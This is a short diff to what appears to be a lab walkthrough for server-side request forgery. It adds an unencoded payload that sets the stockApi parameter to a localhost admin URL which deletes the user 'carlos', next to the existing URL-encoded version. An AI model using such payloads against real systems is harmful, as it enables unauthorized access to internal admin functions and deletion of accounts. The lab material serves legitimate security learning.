@@ -94,6 +94,8 @@ Forwarding it through Burp returns the admin interface — no login required, be
 **5. Delete `carlos`.**
 From inside the now-accessible admin panel, See the username which in our case it's **carlos**. So change the request to this to delete and complete the lab.
 ```
+stockApi=http://localhost/admin/delete?username=carlos
+
 stockApi=http%3a%2f%2flocalhost%2fadmin%2fdelete%3fusername%3dcarlos
 ```
 
